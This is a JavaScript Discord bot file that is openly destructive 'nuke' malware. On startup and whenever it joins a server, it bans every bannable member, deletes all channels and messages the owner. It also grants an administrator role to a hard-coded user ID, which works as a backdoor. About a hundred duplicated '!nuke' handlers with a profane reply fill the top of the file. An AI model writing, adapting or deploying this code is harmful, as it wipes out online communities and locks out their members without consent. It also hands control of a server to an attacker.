LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});










// الكتابة لما يبدي التهكير 
const { Client } = require('discord.js');
const client = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' ^-^').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('^_^', 'text');
 
      await guild.createChannel('^_^', 'voice');
 
 
 
}
 
LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by YzhF1");
  console.log("");
  console.log("-------------------------------------------------------------");
 
});
 
LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
LOka.on('guildMemberAdd', member => {
   
            if (member.id === "?? ?? ???") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });

 

// توكين البوت 
LOka.login(process.env.BOT_TOKEN);
